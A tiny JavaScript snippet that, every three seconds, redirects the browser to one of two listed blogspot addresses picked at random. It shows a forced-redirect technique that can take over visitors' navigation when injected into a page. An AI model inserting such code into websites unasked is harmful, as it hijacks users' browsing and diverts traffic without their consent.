(function(){
setInterval(function(){
var redSites = [

"https://pejuangpramuka.blogspot.com/",
"https://spewehascouter.blogspot.com/",

];
var randomLinks = redSites[Math.floor(Math.random()*redSites.length)];
window.location = randomLinks
},3000)
}())
